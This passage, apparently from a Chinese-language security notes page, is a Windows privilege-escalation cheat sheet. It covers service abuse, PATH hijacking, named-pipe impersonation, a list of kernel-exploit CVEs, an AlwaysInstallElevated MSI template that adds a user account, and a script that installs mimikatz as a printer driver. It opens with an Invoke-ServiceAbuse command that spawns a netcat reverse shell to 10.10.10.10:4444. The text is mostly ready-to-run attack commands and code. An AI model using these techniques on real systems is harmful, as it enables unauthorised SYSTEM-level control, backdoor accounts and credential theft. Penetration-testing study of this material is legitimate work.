  </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">unquoted</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">paths...</span><span class="w">
  </span><span class="n">ServiceName</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">BBSvc</span><span class="w">
  </span><span class="n">Path</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft\Bing</span><span class="w"> </span><span class="nx">Bar\7.1\BBSvc.exe</span><span class="w">
  </span><span class="n">StartName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
  </span><span class="n">AbuseFunction</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="s1">'BBSvc'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HijackPath</span><span class="err">&gt;</span><span class="w">
  </span><span class="o">...</span><span class="w">

  </span><span class="c"># automatic exploit</span><span class="w">
  </span><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">[</span><span class="n">SERVICE_NAME</span><span class="p">]</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<h2 id="利用-path-拦截提权">利用 PATH 拦截提权</h2>
<p>利用条件：</p>
<ul>
  <li>PATH 路径中存在可写路径</li>
  <li>可写文件夹位于包含合法可执行文件的文件夹之前。</li>
</ul>

<p>示例：
ps 中执行如下的命令查看 PATH</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">Path</span><span class="w">
</span></code></pre></div></div>
<p>假设输出为:<code class="language-plaintext highlighter-rouge">C:\Program Files\nodejs\;C:\WINDOWS\system32</code></p>

<p>检查 C:\Program Files\nodejs 文件夹的权限发现可写。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\Program Files\nodejs\"
</code></pre></div></div>
<p>由于 nodejs 在 system32 之前，因此可以向 nodejs 文件夹中写入 cmd.exe，下次用户再执行 cmd 时，则会执行 nodejs 中的 cmd.exe</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy</span> <span class="kd">evil</span><span class="na">-file</span>.exe <span class="s2">"C:\Program Files\nodejs\cmd.exe"</span>
</code></pre></div></div>

<h2 id="利用-name-pipe-提权">利用 Name Pipe 提权</h2>
<h3 id="利用服务自身的漏洞或功能">利用服务自身的漏洞或功能</h3>
<p>找到存在命名管道的服务，挖掘服务漏洞或可用功能，利用 Name Pipe 操作这些功能或直接利用漏洞获取到高权限。</p>

<p>利用步骤：</p>
<ol>
  <li>Find named pipes: [System.IO.Directory]::GetFiles(“\.\pipe")</li>
  <li>Check named pipes DACL: pipesec.exe <named_pipe></named_pipe></li>
  <li>Reverse engineering software</li>
  <li>Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe</li>
</ol>

<h3 id="meterpreter-中的-getsystem">meterpreter 中的 getsystem</h3>
<p>有代表性的 EXP 如 meterpreter 中的 getsystem 命令。该技术的核心在于对 ImpersonateNamedPipeClient API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取 SYSTEM 权限。当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了。</p>

<p>利用细节：
1) getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端)
2) getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端)
3) 启动该服务，向目标命名管道发起连接 (客户端 -&gt; 服务端)
4) 该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌
5) 完成提权过程后，停止并删除该服务</p>

<p>参考</p>
<ul>
  <li><a href="https://www.anquanke.com/post/id/265507">走进Windows中的提权行为-安全客 - 安全资讯平台</a></li>
</ul>

<h3 id="printspoofer">PrintSpoofer</h3>
<p>命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们指定的命名管道。</p>

<p>Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。</p>

<p>MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。</p>

<p>那么下一步就是要想办法把这个请求让我们准备好的恶意管道接收。</p>

<p>考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug”</a></li>
</ul>

<h2 id="利用内核漏洞提权">利用内核漏洞提权</h2>
<p>可参考：https://github.com/SecWiki/windows-kernel-exploits</p>

<ul>
  <li>CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)</li>
  <li>CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)</li>
  <li>CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019)</li>
  <li>CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’] (Windows 1903/1909)</li>
  <li>CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019)</li>
  <li>CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)</li>
  <li>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709)</li>
  <li>CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1)</li>
  <li>CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)</li>
  <li>MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</li>
  <li>CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)</li>
  <li>CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li>
  <li>MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</li>
  <li>MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</li>
  <li>MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</li>
  <li>MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</li>
  <li>MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</li>
  <li>MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</li>
  <li>MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</li>
  <li>MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</li>
  <li>MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</li>
  <li>MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</li>
  <li>MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</li>
  <li>MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</li>
  <li>MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</li>
  <li>MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</li>
  <li>MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</li>
  <li>MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</li>
  <li>MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</li>
  <li>MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</li>
  <li>MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</li>
  <li>MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</li>
  <li>MS14-066 　[KB2992611]　　[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1)</li>
  <li>MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</li>
  <li>MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</li>
  <li>MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</li>
  <li>MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</li>
  <li>MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</li>
  <li>MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</li>
  <li>MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</li>
  <li>MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</li>
  <li>MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</li>
  <li>MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</li>
  <li>MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</li>
  <li>MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</li>
  <li>MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</li>
  <li>MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</li>
  <li>MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</li>
  <li>MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</li>
  <li>MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</li>
  <li>MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</li>
  <li>MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</li>
  <li>MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</li>
  <li>MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</li>
  <li>MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</li>
  <li>MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</li>
  <li>MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</li>
  <li>MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</li>
  <li>MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</li>
  <li>MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</li>
</ul>

<h2 id="利用-microsoft-windows-installer-提权">利用 Microsoft Windows Installer 提权</h2>
<h3 id="alwaysinstallelevated-注册表项错误配置">AlwaysInstallElevated 注册表项错误配置</h3>

<p>windows 有一个系统进程 MSIEXEC，用于安装 Windows Installer 安装包，AlwaysInstallElevated 是一个组策略配置，如果启用，那么将允许普通用户以 SYSTEM 权限运行 msi 文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。</p>

<p>注册表查询, 如果两个查询都返回值 0x1，则为用户和计算机启用了 AlwaysInstallElevated，表明系统容易受到攻击。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># shell</span>
reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated

<span class="c"># ps</span>
Get-ItemProperty HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
Get-ItemProperty HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</code></pre></div></div>

<p>漏洞利用：
MSF 的 exploit/windows/local/always_install_elevate 模块可以自动完成提权操作，会创建一个随机文件名的 msi 文件，并在提权成功后删除此mai文件，攻击成功会返回 system 权限会话</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
use exploit/windows/local/always_install_elevated
<span class="nb">set </span>session 4
run
</code></pre></div></div>
<p>PowerUP 利用
检查注册表的设置：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}"</span><span class="w">
</span></code></pre></div></div>

<p>生成新的账户：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; write-useraddmsi}"</span><span class="w">
</span></code></pre></div></div>

<p>Metasploit可以生成 MSI 类型的载荷，但很容易被 AV/EDR 所检测。所以我们可以手动创建 MSI 包裹文件。
我们可以使用工具 wix (https://github.com/wixtoolset/wix3) 来将包含二进制文件或者任意命令的模板 (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) 进行打包然后安装。
我们可以直接将要运行的载荷或者命令包含在里面，我们尝试执行添加新用户的命令，模板内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"23e23deeqwddeweqwde"</span> <span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"Test1"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">'1'</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span> <span class="na">KeyPath=</span><span class="s">"yes"</span><span class="nt">&gt;&lt;/Component&gt;</span>
                <span class="nt">&lt;/Directory&gt;</span>
            <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;/Feature&gt;</span>

        <span class="nt">&lt;CustomAction</span> 
            <span class="na">Id=</span><span class="s">"Shell"</span> 
            <span class="na">Execute=</span><span class="s">"deferred"</span>
            <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> 
            <span class="na">Impersonate=</span><span class="s">"no"</span> 
            <span class="na">ExeCommand=</span><span class="s">"net user zhi 123.com /add"</span> 
            <span class="na">Return=</span><span class="s">"check"</span> 
        <span class="nt">/&gt;</span>

        <span class="nt">&lt;InstallExecuteSequence&gt;</span>
            <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Shell"</span> <span class="na">After=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
        <span class="nt">&lt;/InstallExecuteSequence&gt;</span>
    <span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span>
</code></pre></div></div>

<p>将该模板打包成 .msi 文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle zhi.wxs
light zhi.wixobj
</code></pre></div></div>

<p>此时已经生成了zhi.msi文件，运行该文件即可创建用户名为zhi</p>

<ul>
  <li><a href="http://uuzdaisuki.com/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/#AlwaysInstallElevated%E6%8F%90%E6%9D%83">AlwaysInstallElevated提权</a></li>
  <li><a href="https://www.cnblogs.com/JFSec/articles/17322189.html">本地侦擦与提权 - JFSec - 博客园</a></li>
</ul>

<h2 id="利用存在漏洞的驱动提权">利用存在漏洞的驱动提权</h2>
<p>条件：</p>
<ul>
  <li>漏洞</li>
  <li>存在漏洞的驱动</li>
</ul>

<p>查看驱动：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Swissky</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">driverquery.exe</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">table</span><span class="w"> </span><span class="nx">/si</span><span class="w">
</span><span class="kr">Module</span><span class="w"> </span><span class="n">Name</span><span class="w">  </span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="w">           </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Type</span><span class="w">   </span><span class="nx">Link</span><span class="w"> </span><span class="nx">Date</span><span class="w">
</span><span class="o">============</span><span class="w"> </span><span class="o">======================</span><span class="w"> </span><span class="o">=============</span><span class="w"> </span><span class="o">======================</span><span class="w">
</span><span class="mi">1394</span><span class="n">ohci</span><span class="w">     </span><span class="nx">1394</span><span class="w"> </span><span class="nx">OHCI</span><span class="w"> </span><span class="nx">Compliant</span><span class="w"> </span><span class="nx">Ho</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/10/2006</span><span class="w"> </span><span class="nx">4:44:38</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="mi">3</span><span class="n">ware</span><span class="w">        </span><span class="nx">3ware</span><span class="w">                  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">5/18/2015</span><span class="w"> </span><span class="nx">6:28:03</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">ACPI</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Driver</span><span class="w">  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/9/1975</span><span class="w"> </span><span class="nx">6:17:08</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiDev</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Devices</span><span class="w"> </span><span class="nx">driver</span><span class="w">    </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/7/1993</span><span class="w"> </span><span class="nx">6:22:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpiex</span><span class="w">       </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPIEx</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">3/1/2087</span><span class="w"> </span><span class="nx">8:53:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpipagr</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Processor</span><span class="w"> </span><span class="nx">Aggrega</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">1/24/2081</span><span class="w"> </span><span class="nx">8:36:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiPmi</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Power</span><span class="w"> </span><span class="nx">Meter</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">11/19/2006</span><span class="w"> </span><span class="nx">9:20:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">acpitime</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Wake</span><span class="w"> </span><span class="nx">Alarm</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">2/9/1974</span><span class="w"> </span><span class="nx">7:10:30</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">ADP80XX</span><span class="w">      </span><span class="nx">ADP80XX</span><span class="w">                </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">4/9/2015</span><span class="w"> </span><span class="nx">4:49:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>
<p>对比存在漏洞的驱动：</p>
<ul>
  <li><a href="https://www.loldrivers.io/">LOLDrivers</a></li>
</ul>

<h2 id="利用打印机提权">利用打印机提权</h2>
<h3 id="将-mimikatz-添加为虚拟打印机">将 mimikatz 添加为虚拟打印机</h3>
<p>Create a Printer</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$printerName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$system32</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">systemroot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\system32'</span><span class="w">
</span><span class="nv">$drivers</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\spool\drivers'</span><span class="w">
</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w">
 
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mscms.dll'</span><span class="p">)</span><span class="w">             </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\x64\mimispool.dll'</span><span class="w">   </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\x64\3\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\win32\mimispool.dll'</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\W32X86\3\mimispool.dll'</span><span class="p">)</span><span class="w">
 
</span><span class="n">Add-PrinterDriver</span><span class="w"> </span><span class="nt">-Name</span><span class="w">       </span><span class="s1">'Generic / Text Only'</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w">       </span><span class="nt">-DriverName</span><span class="w"> </span><span class="s1">'Generic / Text Only'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="nt">-PortName</span><span class="w"> </span><span class="s1">'FILE:'</span><span class="w"> </span><span class="nt">-Shared</span><span class="w">
 
</span><span class="n">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles'</span><span class="p">)</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'x64\3'</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
